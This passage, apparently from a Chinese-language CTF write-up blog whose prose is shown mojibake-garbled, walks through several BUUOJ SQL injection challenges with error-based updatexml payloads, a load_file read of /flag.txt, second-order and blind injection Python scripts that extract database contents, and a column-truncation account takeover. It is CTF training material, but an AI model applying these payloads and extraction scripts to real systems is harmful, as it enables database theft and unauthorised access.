<p>æ›´æ”¹åœ°å€ä¿¡æ¯æ—¶ä¼šæŠ¥sqlè¯­å¥çš„é”™ï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),31,60)),0x7e),1)#</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåœ¨é¡µé¢åˆ›å»ºåœ°å€ä¸ºä¸Šè¿°è¯­å¥çš„è®¢å•ï¼Œåœ¨ä¿®æ”¹åœ°å€é¡µé¢å†æ¬¡è¾“å…¥å°±å¯æŠ¥é”™å›æ˜¾éƒ¨åˆ†flagï¼Œå‰åä¸¤æ¬¡flagæ‹¼æ¥å³å¯</p>
<h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><img src="/2020/05/30/SQLChallenge/1.png" class="">

<p>ç”¨burpæŠ“åŒ…çœ‹åˆ°ä¸€ä¸ªclient-ip,çŒœæµ‹å¯ä»¥ç”¨X-Forwarded-For,æœç„¶ï¼Œæ•°æ®ä¼šå…ˆå†™åˆ°æ•°æ®åº“ä¸­ï¼Œç¬¬äºŒæ¬¡å†™å…¥æ—¶ä¼šæ‹¿å‡ºä¸Šæ¬¡å†™å…¥çš„å†…å®¹ï¼Œå¯ä»¥ç”¨ç›²æ³¨è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:27656/"</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"track_uuid=5d7911a1-6ee7-4468-a15e-4ca7b34ad643"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//F4l9_t4b1e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i, mid)//F4l9_C01uMn</span></span><br><span class="line">        payload = <span class="string">"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or '0"</span>.format(i, mid)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = payload</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = <span class="string">"penson"</span></span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Last Ip: 1 "</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(res)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„å¿…é¡»ä¼ å…¥cookieï¼ŒF12å¯ä»¥æ‰¾åˆ°cookie</p>
<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>å¼€é¢˜ï¼Œæœ‰ä¸€ä¸ªæ³¨å†Œå’Œç™»å½•ï¼Œé¢˜ç›®æç¤ºSQLï¼Œé‚£ä¹ˆè¯•è¯•orã€andä¹‹ç±»çš„æ³¨å†Œï¼Œå‘ç°è¢«è¿‡æ»¤äº†ï¼Œfuzzä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">spaceï¼ˆç©ºæ ¼ï¼‰</span><br><span class="line">substr</span><br><span class="line">mid</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">handle</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œç”¨æˆ·åä¸ºadminâ€çš„ç”¨æˆ·ï¼Œç™»å½•å‘ç°æœ‰ä¿®æ”¹å¯†ç ï¼Œæ ¹æ®å‰é¢é¢˜ç›®çš„ç»éªŒåº”è¯¥åˆæ˜¯ä¸€é“äºŒæ¬¡æ³¨å…¥é¢˜ï¼Œæ¥è¯•è¯•</p>
<img src="/2020/05/30/SQLChallenge/2.png" class="">

<p>å‘ç°åœ¨ä¿®æ”¹å¯†ç æ˜¯ä¼šæŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼æ¥åš</p>
<p>payloadï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>()))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~article,flag,users'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~flag'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~RCTF&#123;Good job! But flag not her'</span></span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥è¿™ä¸ªflagæ˜¯å‡çš„ï¼Œé‚£ä¹ˆå¾—åœ¨åˆ«çš„è¡¨é‡Œæ‰¾æ‰¾ï¼Œå‘ç°åœ¨users</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~name,pwd,email,real_flag_1s_her'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_her))<span class="keyword">from</span>(<span class="keyword">users</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'real_flag_1s_her'</span> <span class="keyword">in</span> <span class="string">'field list'</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯åˆ—æ²¡æœ‰å®Œå…¨è¾“å‡ºï¼Œç”¨regexpåŒ¹é…å§</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)&amp;&amp;(column_name)regexp(<span class="string">'^r'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">':real_flag_1s_here'</span></span><br></pre></td></tr></table></figure>

<p>æœ€åé¢è¯»å–flagæœ‰ä¸ªå‘ï¼Œå°±æ˜¯é•¿åº¦æœ‰é™åˆ¶ï¼Œç”¨reverseå€’åºè¾“å‡ºå³å¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">"^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#</span></span><br></pre></td></tr></table></figure>

<h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>çŸ¥è¯†ç‚¹ï¼šinformation_schemaåº“è¢«ç¦æ­¢è®¿é—®åï¼Œå¯ä»¥ç”¨<strong>sys.schema_auto_increment_columns</strong>ã€<strong>schema_table_statistics_with_buffer</strong>ã€<strong>x$schema_table_statistics_with_buffer</strong></p>
<p>fuzzï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿‡æ»¤and orç­‰å…³é”®å­—</span><br><span class="line">ä¸èƒ½ç”¨information_schemaï¼Œè¿‡æ»¤äº†sys.schema_auto_increment_columns </span><br><span class="line">æ²¡æœ‰å•ç‹¬è¿‡æ»¤unionå’Œselect, ä½†æ˜¯è¿‡æ»¤äº†union select</span><br><span class="line">è¿‡æ»¤join</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æµ‹è¯•æŸ¥è¯¢æ­£å¸¸æ—¶ä¼šè¿”å›NU1L</p>
<p>ä¸Šç›²æ³¨è„šæœ¬ï¼ˆè¿™ä¸ªæ˜¯Yingå¸ˆå‚…çš„è„šæœ¬<a href="https://www.gem-love.com/ctf/1669.htmlï¼‰åé¢çš„å­—ç¬¦ASCIIåç§»ä¸€ä½åŸç†è®²è§£å°±åœ¨è¿™é‡Œé¢ï¼š" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.htmlï¼‰åé¢çš„å­—ç¬¦ASCIIåç§»ä¸€ä½åŸç†è®²è§£å°±åœ¨è¿™é‡Œé¢ï¼š</a></p>
<p>è‡ªå·±å†™çš„äºŒåˆ†æ³•è·‘ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ233333ï¼Œå°±ç”¨Yingå¸ˆå‚…çš„å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">alphabet = [<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,<span class="string">','</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'j'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'g'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'G'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line">target = <span class="string">'select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">        payload = <span class="string">'2||ascii(substr((&#123;&#125;),&#123;&#125;,1))=\'&#123;&#125;\''</span>.format(target, i, ord(char))</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += char</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#users23333333333333,f1ag_1s_h3r3_hhhhh</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(flag)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = <span class="string">'0x'</span> + res.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    hexchar = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+ chr(char))</span><br><span class="line">        payload = <span class="string">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æ ¸å¿ƒpayloadï¼š(<span class="keyword">select</span> <span class="string">'admin'</span>,<span class="string">'admin'</span>)&gt;(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)</span><br><span class="line">MySQLé‡åˆ°<span class="keyword">hex</span>ä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>

<h3 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h3><p>ç™»å½•æ³¨å†Œï¼Œæ³¨å†Œæ˜¯æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œä½†æ˜¯ç™»å½•å´æ²¡æœ‰ç”¨åˆ°ï¼Œç™»å½•æˆåŠŸä¹‹åæ˜¾ç¤ºäº†ç”¨æˆ·åï¼Œä¹Ÿå°±æ˜¯è¯´æ³¨å†Œçš„æ—¶å€™å†™å…¥äº†æ•°æ®åº“ï¼Œä¹‹åå†æ¬¡æ‹¿å‡ºæ˜¾ç¤ºå‡ºæ¥ï¼Œåº”è¯¥å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚æ³¨å†ŒæˆåŠŸä¼š302çŠ¶æ€ç è·³è½¬ï¼Œå¤±è´¥è¿”å›200çŠ¶æ€ç </p>
<p>payloadï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=0'%2B(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> * <span class="keyword">from</span> flag))) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">10</span>))%<span class="number">2</span>B<span class="string">'0</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆpayloadæ˜¯è¿™æ ·çš„ï¼Œçœ‹ä¸€ä¸‹æœ¬åœ°æµ‹è¯•</p>
<img src="/2020/05/30/SQLChallenge/3.png" class="">

<p>åªç»è¿‡hexä¸€æ¬¡çš„æ•°æ®ä¼šæ˜¾ç¤ºä¸å…¨ï¼ŒåŠ ä¸Š0æ˜¯ä¸ºäº†å®Œå…¨æ˜¾ç¤ºï¼Œä¹‹åï¼Œå‘ç°åŠ 0çš„æŸ¥æ‰¾ä¼šåªæ˜¾ç¤ºå­—æ¯ä¹‹å‰çš„æ•°å­—ï¼Œåé¢çš„å…¨éƒ¨è¢«æˆªæ–­äº†ï¼Œæ‰€ä»¥ç”¨ä¸¤æ¬¡hexï¼Œè¿™é‡Œæœ‰æ•°æ®ç²¾åº¦çš„é—®é¢˜ï¼Œç§‘å­¦è®¡æ•°æ³•æ•°æ®æ˜¾ç¤ºä¸å…¨ï¼Œè¿™å°±è¦ç”¨åˆ°substræ¥å‡ ä½å‡ ä½æŸ¥æ‰¾ï¼Œä¸‹é¢çš„æ˜¯ä¸€ä¸ªå…¶ä»–å¸ˆå‚…çš„è„šæœ¬ï¼Œå¯ä»¥ç›´æ¥ç”¨ï¼Œæœ‰æ—¶é—´äº†å†è‡ªå·±å†™å†™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">'-&#125;'</span>+<span class="string">'&#123;'</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">'http://be50c81b-e823-4784-8255-cb37e1378c8c.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(email,username)</span>:</span></span><br><span class="line">    url1 = url+<span class="string">'register.php'</span></span><br><span class="line">    data = dict(email = email, username = username,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    url2 = url+<span class="string">'login.php'</span></span><br><span class="line">    data = dict(email = email,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">"0'^(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))^'0"</span>.format(int(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">'&#123;&#125;@qq.com'</span>.format(str(j)+<span class="string">'14'</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;'</span>,html.text,r.S)</span><br><span class="line">        flag = res[<span class="number">0</span>][<span class="number">1</span>:].strip()</span><br><span class="line">        print(flag)</span><br><span class="line">        f += flag</span><br><span class="line">        print(f)</span><br><span class="line">        print(f.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"problem"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>äºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å…¥ç‚¹åº”è¯¥åœ¨username</p>
<p>å°è¯•ä¸€ä¸‹</p>
<p>æ³¨å†Œ<code>username=admin&#39; or 1=1#&amp;passwd=123</code> </p>
<img src="/2020/05/30/SQLChallenge/4.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ‰å›æ˜¾ï¼Œfuzzå¥½åƒæ²¡æœ‰è¿‡æ»¤ä»€ä¹ˆï¼Œå¸¸è§„unionæ³¨å…¥å³å¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">' union select group_concat(table_name) from information_schema.tables where table_schema='</span>ctftraining<span class="string">'#  FLAG_TABLE,news,users</span></span><br><span class="line"><span class="string">-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'FLAG_TABLE'</span><span class="comment">#FLAG_COLUMN/id,username,password,info,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line"><span class="number">-1</span><span class="string">' union select 1,2,group_concat(FLAG_COLUMN) from FLAG_TABLE#</span></span><br></pre></td></tr></table></figure>

<p>æœ‰ç‚¹é—®é¢˜ï¼Œflagçˆ†ä¸å‡ºï¼Œæ–¹æ³•çŸ¥é“å°±è¡Œäº†ï¼Œä¸çº ç»“äº†ï¼Œåšä¸‹ä¸€é¢˜å»</p>
<h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h2><img src="/2020/05/30/SQLChallenge/5.png" class="">

<p>æœ‰ä¸‰ä¸ªæŒ‰é’®å¯ä»¥æ“ä½œï¼Œå¯ä»¥æ·»åŠ å¯ä»¥çœ‹ï¼Œé¢˜ç›®ç»™äº†æºç é™„ä»¶ï¼Œæ‰’ä¸‹æ¥çœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('messenger', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('instagram', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°flagåœ¨åä¸ºfacebookçš„ç”¨æˆ·è¿™é‡Œï¼Œnameå€¼é•¿åº¦ä¸º64å­—èŠ‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_secret</span><span class="params">($secret)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (strlen($secret) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ·»åŠ ç”¨æˆ·è¿˜éœ€è¦æ·»åŠ å¯†é’¥ï¼Œé•¿åº¦è¦å¤§äº10ä½</p>
<p>é‡ç‚¹ï¼šæ•°æ®åº“çš„å¦ä¸€ä¸ªç‰¹æ€§ï¼Œå½“è®¾è®¡ä¸€ä¸ªå­—æ®µæ—¶ï¼Œæˆ‘ä»¬éƒ½å¿…é¡»å¯¹å…¶è®¾å®šä¸€ä¸ªæœ€å¤§é•¿åº¦ï¼Œæ¯”å¦‚CHAR(10)ï¼ŒVARCHAR(20)ç­‰ç­‰ã€‚ä½†æ˜¯å½“å®é™…æ’å…¥æ•°æ®çš„é•¿åº¦è¶…è¿‡é™åˆ¶æ—¶ï¼Œæ•°æ®åº“å°±ä¼šå°†å…¶è¿›è¡Œæˆªæ–­ï¼Œåªä¿ç•™é™å®šçš„é•¿åº¦ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥æ·»åŠ fackbookçš„è´¦æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è´¦æˆ·ï¼šfacebookç©ºæ ¼</span><br><span class="line"></span><br><span class="line">å¯†ç ï¼šFbctf @ fb10</span><br><span class="line"></span><br><span class="line">æè¿°ï¼šFLAG_HERE</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ æˆåŠŸåæŸ¥çœ‹ä¿¡æ¯ï¼Œå°±èƒ½çœ‹åˆ°flagäº†</p>
<img src="/2020/05/30/SQLChallenge/6.png" class="">

<h2 id="RCTF2019-calcalcalc"><a href="#RCTF2019-calcalcalc" class="headerlink" title="[RCTF2019]calcalcalc"></a>[RCTF2019]calcalcalc</h2><p>ä¸€ä¸ªè®¡ç®—å™¨ï¼Œç›´æ¥çœ‹æºç </p>
<p>python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exec'</span> <span class="keyword">in</span> dir(__builtins__):</span><br><span class="line">        <span class="keyword">del</span> 